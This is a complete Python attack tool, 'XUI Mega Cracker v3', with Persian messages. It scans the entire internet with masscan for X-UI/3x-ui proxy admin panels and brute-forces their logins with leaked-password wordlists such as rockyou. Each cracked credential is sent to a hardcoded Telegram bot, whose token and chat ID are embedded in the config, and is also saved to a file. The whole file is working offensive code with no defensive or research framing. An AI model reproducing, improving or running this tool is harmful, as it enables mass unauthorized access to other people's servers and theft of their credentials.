import requests
import threading
import json
import re
import time
import os
import subprocess
import socket
import ipaddress
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from datetime import datetime
import argparse

# ========== خاموش کردن اخطارهای SSL ==========
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== تنظیمات ==========
CONFIG_FILE = "config.json"
VERSION = "MEGA_V3.0"
AUTHOR = "@jasonmodding"

default_config = {
    "telegram_bot_token": "8608061868:AAHEEsZPOw8vq100WyyusF3QjTlBvTq9-Iw",
    "telegram_chat_id": "7963634461",
    "ports": "443,80,54321,8080,8443,2052,2053,2082,2083,2086,2087,2095,2096",
    "masscan_rate": 1000,
    "max_ips": 500,
    "threads_per_target": 30,
    "delay": 0.15,
    "use_masscan": True,
    "use_public_lists": True,
    "send_realtime_updates": True
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(default_config, f, indent=4)
        return default_config

config = load_config()

# ========== آمار ==========
stats = {
    "total_ips": 0,
    "tested": 0,
    "found": 0,
    "cracked": 0,
    "start_time": datetime.now().isoformat()
}

stop_scan_flag = False

# ========== تلگرام ==========
def send_telegram(message, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/sendMessage"
        payload = {
            "chat_id": config['telegram_chat_id'],
            "text": message[:4000],
            "parse_mode": "Markdown"
        }
        if keyboard:
            payload["reply_markup"] = json.dumps(keyboard)
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        pass

def get_control_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "▶️ Start Scan", "callback_data": "start_scan"}],
            [{"text": "⏹ Stop Scan", "callback_data": "stop_scan"}],
            [{"text": "📊 Status", "callback_data": "status"}],
            [{"text": "⚙️ Config", "callback_data": "config"}],
            [{"text": "📥 Download Results", "callback_data": "download"}]
        ]
    }

def handle_telegram_updates():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/getUpdates"
            r = requests.get(url, params={"offset": last_update_id + 1, "timeout": 20}, timeout=25)
            if r.status_code == 200:
                for update in r.json().get("result", []):
                    last_update_id = update["update_id"]
                    message = update.get("message")
                    callback = update.get("callback_query")
                    if message and message.get("text"):
                        text = message["text"]
                        if text.startswith("/start"):
                            send_telegram("🚀 *XUI Mega Cracker v3*\n\nکنترل پنل شیشه‌ای فعال شد.\n\n`/status` - گزارش وضعیت\n`/stop` - توقف اسکن", get_control_keyboard())
                        elif text.startswith("/status"):
                            send_status_report()
                        elif text.startswith("/stop"):
                            global stop_scan_flag
                            stop_scan_flag = True
                            send_telegram("⏹ اسکن متوقف شد.")
                    if callback:
                        data = callback["data"]
                        if data == "start_scan":
                            send_telegram("▶️ اسکن شروع شد.")
                        elif data == "stop_scan":
                            stop_scan_flag = True
                            send_telegram("⏹ اسکن متوقف شد.")
                        elif data == "status":
                            send_status_report()
                        elif data == "config":
                            send_config_menu()
                        elif data == "download":
                            send_telegram("📥 نتایج در فایل `good.txt` ذخیره شده.")
        except Exception as e:
            pass
        time.sleep(2)

def send_status_report():
    global stats
    runtime = datetime.now() - datetime.fromisoformat(stats.get("start_time", datetime.now().isoformat()))
    msg = f"""
📊 *گزارش وضعیت*

🖥️ کل آیپی‌ها: `{stats.get('total_ips', 0)}`
🔍 تست شده: `{stats.get('tested', 0)}`
✅ X-UI پیدا شده: `{stats.get('found', 0)}`
🔑 کرک شده: `{stats.get('cracked', 0)}`
⏱️ زمان اجرا: `{str(runtime).split('.')[0]}`

📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    send_telegram(msg)

def send_config_menu():
    msg = "⚙️ *تنظیمات فعلی:*\n\n"
    for key, value in config.items():
        msg += f"`{key}`: {value}\n"
    msg += "\nبرای تغییر تنظیمات، فایل `config.json` رو ویرایش کن."
    send_telegram(msg)

# ========== دانلود لیست‌های عظیم ==========
MEGA_SOURCES = {
    "passwords": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-common-passwords.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/MySpace.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/Facebook.txt",
        "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt",
        "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top1575-probable-v2.txt",
    ],
    "usernames": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-500.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt",
    ]
}

def fetch_massive_wordlists():
    os.makedirs("wordlists", exist_ok=True)
    all_passwords = set()
    all_usernames = set()
    
    for url in MEGA_SOURCES["passwords"]:
        try:
            r = requests.get(url, timeout=20)
            lines = r.text.splitlines()
            all_passwords.update([l.strip() for l in lines if l.strip()])
        except:
            pass
    
    for url in MEGA_SOURCES["usernames"]:
        try:
            r = requests.get(url, timeout=20)
            lines = r.text.splitlines()
            all_usernames.update([l.strip() for l in lines if l.strip()])
        except:
            pass
    
    default_creds = ["admin", "root", "user", "test", "support", "admin123", "123456", "password"]
    all_usernames.update(default_creds)
    all_passwords.update(default_creds)
    
    with open("wordlists/passwords.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(all_passwords))
    with open("wordlists/usernames.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(all_usernames))
    
    send_telegram(f"📦 لیست‌ها آماده: {len(all_passwords)} پسورد، {len(all_usernames)} یوزر")
    return len(all_passwords), len(all_usernames)

# ========== روش ۱: اسکن با masscan ==========
def scan_ports_with_masscan():
    ips = set()
    try:
        subprocess.run(["masscan", "--version"], capture_output=True, check=True)
    except:
        send_telegram("❌ masscan نصب نیست. در حال نصب...")
        os.system("sudo apt-get update && sudo apt-get install -y masscan")
    
    ports = config['ports']
    rate = config['masscan_rate']
    send_telegram(f"🔍 شروع اسکن پورت‌های {ports}...")
    
    try:
        cmd = f"masscan 0.0.0.0/0 -p{ports} --rate={rate} -oJ masscan_output.json 2>/dev/null"
        subprocess.run(cmd, shell=True, timeout=180)
        
        if os.path.exists("masscan_output.json"):
            with open("masscan_output.json", 'r') as f:
                data = json.load(f)
                for host in data:
                    ip = host.get("ip")
                    if ip:
                        ips.add(ip)
            send_telegram(f"✅ masscan پیدا کرد: {len(ips)} آیپی")
    except Exception as e:
        send_telegram(f"❌ خطا در masscan: {str(e)}")
    
    return ips

# ========== روش ۳: لیست‌های عمومی ==========
PUBLIC_LISTS = [
    "https://raw.githubusercontent.com/ipscans/ip-scan/main/ip.txt",
    "https://raw.githubusercontent.com/iranxray/hope/main/ip.txt",
    "https://raw.githubusercontent.com/iranxray/v2ray/main/ip.txt",
    "https://raw.githubusercontent.com/mikeyhodl/ip-lists/main/ips.txt",
    "https://raw.githubusercontent.com/v2ray/geoip/release/geoip.dat",
]

def fetch_public_ip_lists():
    ips = set()
    send_telegram("🌐 دانلود لیست‌های عمومی آیپی...")
    
    for url in PUBLIC_LISTS:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                found = re.findall(r'\d+\.\d+\.\d+\.\d+', r.text)
                for ip in found:
                    try:
                        ipaddress.ip_address(ip)
                        ips.add(ip)
                    except:
                        pass
                send_telegram(f"✅ از {url.split('/')[-1]}: {len(found)} آیپی")
        except Exception as e:
            pass
    
    send_telegram(f"📦 جمع آیپی‌های عمومی: {len(ips)}")
    return ips

# ========== تست آیپی‌ها ==========
def is_xui_alive(ip, port=443):
    try:
        for proto in ["https", "http"]:
            url = f"{proto}://{ip}:{port}/"
            r = requests.get(url, timeout=3, verify=False)
            if r.status_code < 500:
                if "X-UI" in r.text or "3x-ui" in r.text or "xray" in r.text.lower():
                    return True
        return False
    except:
        return False

def test_ips(ip_list):
    global stats, stop_scan_flag
    valid_ips = []
    total = len(ip_list)
    stats['total_ips'] = total
    
    send_telegram(f"🧪 تست {total} آیپی...")
    
    def test_single(ip):
        if stop_scan_flag:
            return None
        for port in [443, 80, 54321]:
            if is_xui_alive(ip, port):
                return ip
        return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(test_single, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            if stop_scan_flag:
                break
            stats['tested'] += 1
            result = future.result()
            if result:
                valid_ips.append(result)
                stats['found'] += 1
                send_telegram(f"✅ X-UI زنده: `{result}`")
            
            if stats['tested'] % 20 == 0:
                send_telegram(f"📊 پیشرفت: {stats['tested']}/{total} | پیدا شده: {stats['found']}")
    
    with open("stats.json", 'w') as f:
        json.dump(stats, f)
    
    return valid_ips

# ========== ادغام و اجرای همزمان ==========
def fetch_ips_combined():
    global stop_scan_flag
    stop_scan_flag = False
    ips = set()
    results = []
    
    def run_masscan():
        if config['use_masscan']:
            result = scan_ports_with_masscan()
            results.append(result)
    
    def run_public():
        if config['use_public_lists']:
            result = fetch_public_ip_lists()
            results.append(result)
    
    t1 = threading.Thread(target=run_masscan)
    t2 = threading.Thread(target=run_public)
    t1.start()
    t2.start()
    t1.join(timeout=180)
    t2.join(timeout=60)
    
    for res in results:
        ips.update(res)
    
    send_telegram(f"🎯 جمع کل آیپی‌ها: {len(ips)}")
    
    valid_ips = test_ips(list(ips))
    
    with open("ips.txt", "w") as f:
        for ip in valid_ips:
            f.write(ip + "\n")
    
    send_telegram(f"🌐 نهایی: {len(valid_ips)} آیپی X-UI زنده")
    return valid_ips

# ========== توابع کرک ==========
def get_csrf(target_url):
    try:
        r = requests.get(target_url, timeout=5, verify=False)
        patterns = [
            r'name="csrf_token"\s+value="([^"]+)"',
            r'csrf-token\s*:\s*"([^"]+)"',
            r'x-csrf-token\s*:\s*"([^"]+)"',
            r'<meta[^>]+csrf-token[^>]+content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, r.text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    except:
        return None

def try_login(target_url, username, password, csrf):
    try:
        url = urljoin(target_url, "/login")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        }
        if csrf:
            headers["x-csrf-token"] = csrf
        data = {"username": username, "password": password}
        r = requests.post(url, data=data, headers=headers, timeout=5, verify=False)
        if r.status_code == 200:
            try:
                if r.json().get("success"):
                    return True
            except:
                if "dashboard" in r.text.lower():
                    return True
        return False
    except:
        return False

def crack_single_target(target, usernames, passwords, thread_count=30):
    global stats
    target = f"https://{target}" if "://" not in target else target
    
    csrf = get_csrf(target)
    if not csrf:
        return 0
    
    found = []
    stop = threading.Event()
    
    def worker(username_chunk):
        for user in username_chunk:
            if stop.is_set():
                break
            for pwd in passwords:
                if stop.is_set():
                    break
                if try_login(target, user, pwd, csrf):
                    cred = f"{user}:{pwd}"
                    found.append(cred)
                    send_telegram(f"🔑 *کرک شد!*\n`{target}`\n`{cred}`")
                    with open("good.txt", "a") as f:
                        f.write(f"{target} | {cred} | {datetime.now()}\n")
                    stop.set()
                    return
                time.sleep(config['delay'])
    
    chunk_size = max(1, len(usernames) // thread_count)
    threads = []
    for i in range(thread_count):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < thread_count - 1 else len(usernames)
        chunk = usernames[start:end]
        if chunk:
            t = threading.Thread(target=worker, args=(chunk,))
            t.start()
            threads.append(t)
    
    for t in threads:
        t.join()
    
    if found:
        stats['cracked'] += 1
        return len(found)
    return 0

def crack_targets(ips, usernames, passwords):
    global stats
    total = len(ips)
    found_total = 0
    
    send_telegram(f"🔑 شروع کرک {total} آیپی با {len(passwords)} پسورد...")
    
    for i, target in enumerate(ips):
        if stop_scan_flag:
            break
        send_telegram(f"🎯 کرک {i+1}/{total}: `{target}`")
        result = crack_single_target(target, usernames, passwords, config['threads_per_target'])
        found_total += result
    
    send_telegram(f"🎉 *کرک کامل شد!*\n`{found_total}` کرِدن پیدا شد.")
    return found_total

# ========== اجرای اصلی ==========
def main():
    parser = argparse.ArgumentParser(description="XUI Mega Cracker v3")
    parser.add_argument("--fetch-wordlists", action="store_true", help="دانلود لیست‌های عظیم")
    parser.add_argument("--fetch-ips", action="store_true", help="فقط پیدا کردن آیپی‌ها")
    parser.add_argument("--target", help="هدف خاص")
    parser.add_argument("--threads", type=int, default=30, help="تعداد ترد")
    parser.add_argument("--chunk", type=int, help="چانک ID برای اکشنز")
    parser.add_argument("--total-chunks", type=int, default=20, help="تعداد کل چانک‌ها")
    args = parser.parse_args()
    
    # راه‌اندازی تلگرام (در ترد جدا)
    t_telegram = threading.Thread(target=handle_telegram_updates)
    t_telegram.daemon = True
    t_telegram.start()
    
    send_telegram(f"🚀 *XUI Mega Cracker v3* راه‌اندازی شد!", get_control_keyboard())
    
    if args.fetch_wordlists:
        fetch_massive_wordlists()
        return
    
    if args.fetch_ips:
        ips = fetch_ips_combined()
        print(f"[+] Found {len(ips)} IPs")
        return
    
    # آماده‌سازی لیست‌ها
    if not os.path.exists("wordlists/passwords.txt") or not os.path.exists("wordlists/usernames.txt"):
        send_telegram("📦 لیست‌ها پیدا نشد. در حال دانلود...")
        fetch_massive_wordlists()
    
    with open("wordlists/passwords.txt", "r", encoding="utf-8", errors="ignore") as f:
        all_passwords = [l.strip() for l in f if l.strip()]
    with open("wordlists/usernames.txt", "r", encoding="utf-8", errors="ignore") as f:
        all_usernames = [l.strip() for l in f if l.strip()]
    
    if args.chunk and args.total_chunks:
        chunk_size = max(1, len(all_passwords) // args.total_chunks)
        start = (args.chunk - 1) * chunk_size
        end = start + chunk_size if args.chunk < args.total_chunks else len(all_passwords)
        passwords = all_passwords[start:end]
    else:
        passwords = all_passwords
    
    if args.target:
        targets = [args.target]
    else:
        if not os.path.exists("ips.txt"):
            send_telegram("🔍 پیدا کردن آیپی‌ها...")
            ips = fetch_ips_combined()
            targets = ips
        else:
            with open("ips.txt", "r") as f:
                targets = [l.strip() for l in f if l.strip()]
    
    if targets:
        crack_targets(targets, all_usernames, passwords)
    else:
        send_telegram("❌ هیچ آیپی‌ای برای کرک وجود ندارد.")
    
    send_telegram("✅ *همه کارها تموم شد!*", get_control_keyboard())

if __name__ == "__main__":
    main()
